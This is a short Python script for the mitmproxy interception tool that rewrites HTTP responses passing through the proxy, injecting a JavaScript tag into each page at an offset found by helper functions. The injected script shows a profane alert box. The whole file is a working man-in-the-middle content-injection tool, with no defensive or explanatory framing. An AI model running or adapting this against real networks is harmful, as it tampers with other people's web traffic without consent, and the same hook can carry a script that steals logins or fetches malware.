from libmproxy.models import decoded
from utility import *


injected = ''' 
<script>
    alert("Fuck you.");
</script>
'''


def response(context, flow):
    with decoded(flow.response):
        offset = find_injection_offset(flow.response.content) 
        if offset is not None:
            flow.response.content = inject(flow.response.content, injected, offset)
